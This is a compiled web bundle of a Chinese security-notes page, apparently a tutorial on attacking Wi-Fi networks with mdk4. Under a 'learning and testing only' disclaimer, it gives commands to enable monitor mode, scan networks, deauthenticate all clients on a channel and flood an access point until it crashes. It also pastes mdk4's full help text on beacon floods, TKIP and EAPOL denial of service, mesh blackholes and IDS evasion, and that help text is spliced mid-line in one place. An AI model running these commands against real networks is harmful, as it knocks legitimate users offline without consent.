"use strict";(self.webpackChunkmeoo_space=self.webpackChunkmeoo_space||[]).push([[8296],{3905:(e,n,t)=>{t.d(n,{Zo:()=>d,kt:()=>h});var a=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function r(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},s=Object.keys(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var c=a.createContext({}),l=function(e){var n=a.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},d=function(e){var n=l(e.components);return a.createElement(c.Provider,{value:n},e.children)},p={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},u=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,s=e.originalType,c=e.parentName,d=r(e,["components","mdxType","originalType","parentName"]),u=l(t),h=o,f=u["".concat(c,".").concat(h)]||u[h]||p[h]||s;return t?a.createElement(f,i(i({ref:n},d),{},{components:t})):a.createElement(f,i({ref:n},d))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var s=t.length,i=new Array(s);i[0]=u;var r={};for(var c in n)hasOwnProperty.call(n,c)&&(r[c]=n[c]);r.originalType=e,r.mdxType="string"==typeof e?e:o,i[1]=r;for(var l=2;l<s;l++)i[l]=t[l];return a.createElement.apply(null,i)}return a.createElement.apply(null,t)}u.displayName="MDXCreateElement"},4041:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>r,toc:()=>l});var a=t(7462),o=(t(7294),t(3905));const s={sidebar_position:2,title:"Mdk4 \u65e0\u7ebf\u653b\u51fb",slug:"/mdk4-attack"},i=void 0,r={unversionedId:"notes/whitehat/mdk4",id:"notes/whitehat/mdk4",title:"Mdk4 \u65e0\u7ebf\u653b\u51fb",description:"\u672c\u7bc7\u5185\u5bb9\u4ec5\u7528\u4e8e\u5b66\u4e60\u548c\u6d4b\u8bd5\uff0c\u672c\u4eba\u9075\u7eaa\u5b88\u6cd5\u3002",source:"@site/docs/notes/whitehat/mdk4.md",sourceDirName:"notes/whitehat",slug:"/mdk4-attack",permalink:"/docs/mdk4-attack",draft:!1,editUrl:"https://github.com/hzwz/hzwz.github.io/tree/main/docs/notes/whitehat/mdk4.md",tags:[],version:"current",lastUpdatedBy:"ICE",sidebarPosition:2,frontMatter:{sidebar_position:2,title:"Mdk4 \u65e0\u7ebf\u653b\u51fb",slug:"/mdk4-attack"},sidebar:"notes",previous:{title:"Arp \u653b\u51fb",permalink:"/docs/arpspoof"}},c={},l=[{value:"\u5b89\u88c5",id:"\u5b89\u88c5",level:2},{value:"\u4f7f\u7528",id:"\u4f7f\u7528",level:2},{value:"\u542f\u7528\u76d1\u542c\u6a21\u5f0f",id:"\u542f\u7528\u76d1\u542c\u6a21\u5f0f",level:3},{value:"\u626b\u63cf\u65e0\u7ebf\u7f51\u7edc",id:"\u626b\u63cf\u65e0\u7ebf\u7f51\u7edc",level:3},{value:"\u5e38\u7528\u60c5\u666f",id:"\u5e38\u7528\u60c5\u666f",level:3},{value:"\u653b\u51fb\u6a21\u5f0f",id:"\u653b\u51fb\u6a21\u5f0f",level:3},{value:"\u653b\u51fb\u53c2\u6570",id:"\u653b\u51fb\u53c2\u6570",level:3}],d={toc:l};function p(e){let{components:n,...t}=e;return(0,o.kt)("wrapper",(0,a.Z)({},d,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"\u672c\u7bc7\u5185\u5bb9\u4ec5\u7528\u4e8e\u5b66\u4e60\u548c\u6d4b\u8bd5\uff0c\u672c\u4eba\u9075\u7eaa\u5b88\u6cd5\u3002")),(0,o.kt)("p",null,"Mdk3 \u5df2\u7ecf\u4e0d\u5728\u7ef4\u62a4\uff0c\u4e14\u5b83\u65e0\u6cd5\u653b\u51fb 5Ghz \u9891\u6bb5\u7684 WiFi\uff0c\u800c Mdk4 \u52a0\u5165\u4e86 5Ghz \u9891\u6bb5\u7684\u652f\u6301\uff0c\u5f53\u7136\u7528\u65b0\u4e0d\u7528\u65e7\u3002\u5728\u5b9e\u8df5\u4e2d\uff0cWPA3 \u534f\u8bae\u7684 WIFI \u5bf9 Deauth \u548c\u6cdb\u6d2a\u653b\u51fb\u4f3c\u4e4e\u514d\u75ab\uff0c\u591a\u6b21\u5c1d\u8bd5\u5747\u662f\u5982\u6b64\u3002\u800c WPA2 \u4ee5\u53ca\u66f4\u4f4e\u7ea7\u7684\u534f\u8bae\u7684 WIFI \u80fd\u591f\u8f7b\u6613\u88ab\u653b\u51fb\uff0c\u4ea7\u751f\u663e\u8457\u6548\u679c\u3002"),(0,o.kt)("h2",{id:"\u5b89\u88c5"},"\u5b89\u88c5"),(0,o.kt)("p",null,"\u5b89\u88c5 ",(0,o.kt)("inlineCode",{parentName:"p"},"aircrack-ng")," \u548c ",(0,o.kt)("inlineCode",{parentName:"p"},"mdk4")," \uff0cManjaro \u53ef\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"yay -S aircrack-ng mdk4\n")),(0,o.kt)("h2",{id:"\u4f7f\u7528"},"\u4f7f\u7528"),(0,o.kt)("h3",{id:"\u542f\u7528\u76d1\u542c\u6a21\u5f0f"},"\u542f\u7528\u76d1\u542c\u6a21\u5f0f"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo airmon-ng start wlp8s0\n")),(0,o.kt)("p",null,"\u5f97\u5230 wlp8s0mon \u4f5c\u4e3a\u76d1\u542c\u63a5\u53e3\uff0c\u6267\u884c\u653b\u51fb\u547d\u4ee4\u65f6\u5747\u4f7f\u7528\u76d1\u542c\u63a5\u53e3\u3002"),(0,o.kt)("h3",{id:"\u626b\u63cf\u65e0\u7ebf\u7f51\u7edc"},"\u626b\u63cf\u65e0\u7ebf\u7f51\u7edc"),(0,o.kt)("p",null,"\u5bf9 2.4Ghz \u9891\u6bb5\u7684 WiFi \u626b\u63cf"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo airodump-ng wlp8s0mon\n")),(0,o.kt)("p",null,"\u5bf9 5Ghz \u9891\u6bb5\u7684 WiFi \u626b\u63cf\uff0c\u5176\u4e2d\u53c2\u6570 ",(0,o.kt)("inlineCode",{parentName:"p"},"a")," \u8868\u793a 5Ghz \u7684 802.11a \u6807\u51c6\uff0c\u4e5f\u53ef\u4ee5\u662f ",(0,o.kt)("inlineCode",{parentName:"p"},"b")," \u548c ",(0,o.kt)("inlineCode",{parentName:"p"},"g")," \uff0c\u5206\u522b\u4ee3\u8868 802.11b \u548c 802.11g\uff0c\u4ed6\u4fe9\u7684\u9891\u6bb5\u4e3a 2.4 Ghz"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo airodump-ng --band a wlp8s0mon \n")),(0,o.kt)("h3",{id:"\u5e38\u7528\u60c5\u666f"},"\u5e38\u7528\u60c5\u666f"),(0,o.kt)("p",null,"Deauthentication \u653b\u51fb\uff0c\u65ad\u6389\u4fe1\u9053\u4e3a 11 \u65e0\u7ebf\u7f51\u7edc\u7684\u5168\u90e8\u5ba2\u6237\u7aef\u8fde\u63a5"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo mdk4 wlp8s0mon d -c 11\n")),(0,o.kt)("p",null,"\u8eab\u4efd\u9a8c\u8bc1\u653b\u51fb\uff0c\u653b\u51fb BSSID \u4e3a ",(0,o.kt)("inlineCode",{parentName:"p"},"AE:15:5d:ad:40:9b")," \u7684\u63a5\u5165\u70b9\uff0c\u4f7f\u5176\u5d29\u6e83\u91cd\u542f"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"sudo mdk4 wlp8s0mon a -a AE:15:5d:ad:40:9b\n")),(0,o.kt)("h3",{id:"\u653b\u51fb\u6a21\u5f0f"},"\u653b\u51fb\u6a21\u5f0f"),(0,o.kt)("p",null,"\u4e00\u822c\u4e5f\u5c31\u7528 a \u548c d\uff0c\u7528\u4fe1\u6807\u653b\u51fb\u592a\u79bb\u8c31\u592a\u660e\u663e"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"ATTACK MODE b: Beacon Flooding\n  Sends beacon frames to show fake APs at clients.\n  This can sometimes crash network scanners and even drivers!\nATTACK MODE a: Authentication Denial-Of-Service\n  Sends authentication frames to all APs found in range.\n  Too many clients can freeze or reset several APs.\nATTACK MODE p: SSID Probing and Bruteforcing\n  Probes APs and checks for answer, useful for checking if SSID has been correctly decloaked and if AP is in your sending range.\n  Bruteforcing of hidden SSIDs with or without a wordlist is also available.\nATTACK MODE d: Deauthentication and Disassociation\n  Sends deauthentication and disassociation packets to stations based on data traffic to disconnect all clients from an AP.\nATTACK MODE m: Michael Countermeasures Exploitation\n  Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs.\n  AP will then shutdown for a whole minute, making this an effective DoS.\nATTACK MODE e: EAPOL Start and Logoff Packet Injection\n  Floods an AP with EAPOL Start frames to keep it busy with fake sessions and thus disables it to handle any legitimate clients. Or logs off clients by injecting fake EAPOL Logoff messages.\nATTACK MODE s: Attacks for IEEE 802.11s mesh networks\n  Various attacks on link management and routing in mesh networks\n  Flood neighbors and routes, create black holes and divert traffic!\nATTACK MODE w: WIDS Confusion\n  Confuse/Abuse Intrusion Detection and Prevention Systems by cross-connecting clients to multiple WDS nodes or fake rogue APs.\nATTACK MODE f: Packet Fuzzer\n  A simple packet fuzzer with multiple packet sources and a nice set of modifiers. Be careful!\nATTACK MODE x: Poc Testing\n  Proof-of-concept of WiFi protocol implementation vulnerability, to test whether the device has wifi vulnerabilities.\n  It may cause the wifi connection to be disconnected or the target device to crash.\n")),(0,o.kt)("h3",{id:"\u653b\u51fb\u53c2\u6570"},"\u653b\u51fb\u53c2\u6570"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"mdk4 <interface> <attack_mode> [attack_options]\nmdk4 <interface in> <interface out> <attack_mode> [attack_options]\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"    ATTACK MODE b: Beacon Flooding\n      Sends beacon frames to generate fake APs at clients.\n      This can sometimes crash network scanners and drivers!\n          -n <ssid>\n         Use SSID <ssid> instead of randomly generated ones\n          -a\n         Use also non-printable caracters in generated SSIDs\n         and create SSIDs that break the 32-byte limit\n          -f <filename>\n         Read SSIDs from file\n          -v <filename>\n         Read MACs and SSIDs from file. See example file!\n          -t <adhoc>\n         -t 1 = Create only Ad-Hoc network\n         -t 0 = Create only Managed (AP) networks\n         without this option, both types are generated\n          -w <encryptions>\n         Select which type of encryption the fake networks shall have\n         Valid options: n = No Encryption, w = WEP, t = TKIP (WPA), a = AES (WPA2)\n         You can select multiple types, i.e. \"-w wta\" will only create WEP and WPA networks\n          -b <bitrate>\n         Select if 11 Mbit (b) or 54 MBit (g) networks are created\n         Without this option, both types will be used.\n          -m\n         Use valid accesspoint MAC from built-in OUI database\n          -h\n         Hop to channel where network is spoofed\n         This is more effective with some devices/drivers\n         But it reduces packet rate due to channel hopping.\n          -c <chan>\n         Create fake networks on channel <c     ATTACK MODE f: Packet Fuzzer\n      A simple packet fuzzer with multiple packet sources\n      and a nice set of modifiers. Be careful!han>. If you want your card to\n         hop on this channel, you have to set -h option, too.\n          -i <HEX>\n         Add user-defined IE(s) in hexadecimal at the end of the tagged parameters\n          -s <pps>\n         Set speed in packets per second (Default: 50)\n\n    ATTACK MODE a: Authentication Denial-Of-Service\n      Sends authentication frames to all APs found in range.\n      Too many clients can freeze or reset several APs.\n          -a <ap_mac>\n         Only test the specified AP\n          -m\n         Use valid client MAC from built-in OUI database\n          -i <ap_mac>\n         Perform intelligent test on AP\n         This test connects clients to the AP and reinjects sniffed data to keep them alive.\n          -s <pps>\n         Set speed in packets per second (Default: unlimited)\n\n    ATTACK MODE p: SSID Probing and Bruteforcing\n      Probes APs and checks for answer, useful for checking if SSID has\n      been correctly decloaked and if AP is in your sending range.\n      Bruteforcing of hidden SSIDs with or without a wordlist is also available.\n          -e <ssid>\n         SSID to probe for\n          -f <filename>\n         Read SSIDs from file for bruteforcing hidden SSIDs\n          -t <bssid>\n         Set MAC address of target AP\n          -s <pps>\n         Set speed (Default: 400)\n          -b <character sets>\n         Use full Bruteforce mode (recommended for short SSIDs only!)\n         You can select multiple character sets at once:\n         * n (Numbers:   0-9)\n         * u (Uppercase: A-Z)\n         * l (Lowercase: a-z)\n         * s (Symbols: ASCII)\n          -p <word>\n         Continue bruteforcing, starting at <word>.\n          -r <channel>\n         Probe request tests (mod-musket)\n\n    ATTACK MODE d: Deauthentication and Disassociation\n      Sends deauthentication and disassociation packets to stations\n      based on data traffic to disconnect all clients from an AP.\n          -w <filename>\n         Read file containing MACs not to care about (Whitelist mode)\n          -b <filename>\n         Read file containing MACs to run test on (Blacklist Mode)\n          -s <pps>\n         Set speed in packets per second (Default: unlimited)\n          -x\n         Enable full IDS stealth by matching all Sequence Numbers\n         Packets will only be sent with clients' addresses\n          -c [chan,chan,...,chan[:speed]]\n         Enable channel hopping. When -c h is given, mdk4 will hop an all\n         14 b/g channels. Channel will be changed every 3 seconds,\n         if speed is not specified. Speed value is in milliseconds!\n          -E <AP ESSID>\n         Specify an AP ESSID to attack.\n          -B <AP BSSID>\n         Specify an AP BSSID to attack.\n          -S <Station MAC address>\n         Specify a station MAC address to attack.\n          -W <Whitelist Station MAC address>\n         Specify a whitelist station MAC.\n\n    ATTACK MODE m: Michael Countermeasures Exploitation\n      Sends random packets or re-injects duplicates on another QoS queue\n      to provoke Michael Countermeasures on TKIP APs.\n      AP will then shutdown for a whole minute, making this an effective DoS.\n          -t <bssid>\n         Set target AP, that runs TKIP encryption\n          -j\n         Use the new QoS exploit which only needs to reinject a few packets instead\n         of the random packet injection, which is unreliable but works without QoS.\n          -s <pps>\n         Set speed in packets per second (Default: 400)\n          -w <seconds>\n         Wait <seconds> between each random packet burst (Default: 10)\n          -n <count>\n         Send <count> random packets per burst (Default: 70)\n\n    ATTACK MODE e: EAPOL Start and Logoff Packet Injection\n      Floods an AP with EAPOL Start frames to keep it busy with fake sessions\n      and thus disables it to handle any legitimate clients.\n      Or logs off clients by injecting fake EAPOL Logoff messages.\n          -t <bssid>\n         Set target WPA AP\n          -s <pps>\n         Set speed in packets per second (Default: 400)\n          -l\n         Use Logoff messages to kick clients\n\n    ATTACK MODE s: Attacks for IEEE 802.11s mesh networks\n      Various attacks on link management and routing in mesh networks.\n      Flood neighbors and routes, create black holes and divert traffic!\n          -f <type>\n         Basic fuzzing tests. Picks up Action and Beacon frames from the air, modifies and replays them:\n         The following modification types are implemented:\n         1: Replay identical frame until new one arrives (duplicate flooding)\n         2: Change Source and BSSID (possibly resulting in Neighbor Flooding)\n         3: Cut packet short, leave 802.11 header intact (find buffer errors)\n         4: Shotgun mode, randomly overwriting bytes after header (find bugs)\n         5: Skript-kid's automated attack trying all of the above randomly :)\n          -b <impersonated_meshpoint>\n         Create a Blackhole, using the impersonated_meshpoint's MAC address\n         mdk4 will answer every incoming Route Request with a perfect route over the impersonated node.\n          -p <impersonated_meshpoint>\n         Path Request Flooding using the impersonated_meshpoint's address\n         Adjust the speed switch (-s) for maximum profit!\n          -l\n         Just create loops on every route found by modifying Path Replies\n          -s <pps>\n         Set speed in packets per second (Default: 100)\n          -n <meshID>\n         Target this mesh network\n\n    ATTACK MODE w: WIDS Confusion\n      Confuse/Abuse Intrusion Detection and Prevention Systems by\n      cross-connecting clients to multiple WDS nodes or fake rogue APs.\n      Confuses a WDS with multi-authenticated clients which messes up routing tables\n          -e <SSID>\n         SSID of target WDS network\n          -c [chan,chan,...,chan[:speed]]\n         Enable channel hopping. When -c h is given, mdk4 will hop an all\n         14 b/g channels. Channel will be changed every 3 seconds,\n         if speed is not specified. Speed value is in milliseconds!\n          -z\n         activate Zero_Chaos' WIDS exploit\n         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n          -s <pps>\n         Set speed in packets per second (Default: 100)\n\n    ATTACK MODE f: Packet Fuzzer\n      A simple packet fuzzer with multiple packet sources\n      and a nice set of modifiers. Be careful!\n      mdk4 randomly selects the given sources and one or multiple modifiers.\n          -s <sources>\n         Specify one or more of the following packet sources:\n         a - Sniff packets from the air\n         b - Create valid beacon frames with random SSIDs and properties\n         c - Create CTS frames to broadcast (you can also use this for a CTS DoS)\n         p - Create broadcast probe requests\n          -m <modifiers>\n         Select at least one of the modifiers here:\n         n - No modifier, do not modify packets\n         b - Set destination address to broadcast\n         m - Set source address to broadcast\n         s - Shotgun: randomly overwrites a couple of bytes\n         t - append random bytes (creates broken tagged parameters in beacons/probes)\n         c - Cut packets short, preferably somewhere in headers or tags\n         d - Insert random values in Duration and Flags fields\n          -c [chan,chan,...,chan[:speed]]\n         Enable channel hopping. When -c h is given, mdk4 will hop an all\n         14 b/g channels. Channel will be changed every 3 seconds,\n         if speed is not specified. Speed value is in milliseconds!\n          -p <pps>\n         Set speed in packets per second (Default: 250)\n    \n    ATTACK MODE x: Poc Testing\n      Proof-of-concept of WiFi protocol implementation vulnerability,\n      to test whether the device has wifi vulnerabilities.\n      It may cause the wifi connection to be disconnected or the target device to crash.\n          -s <pps>\n           Set speed in packets per second (Default: unlimited)\n          -c [chan,chan,...,chan[:speed]]\n            Enable channel hopping. When -c h is given, mdk4 will hop an all\n            14 b/g channels. Channel will be changed every 3 seconds,\n            if speed is not specified. Speed value is in milliseconds!\n          -v <vendor>\n            file name in pocs dir, default test all.\n          -A <AP MAC>\n            set an AP MAC\n          -S <Station MAC>\n            set a station MAC.\n")))}p.isMDXComponent=!0}}]);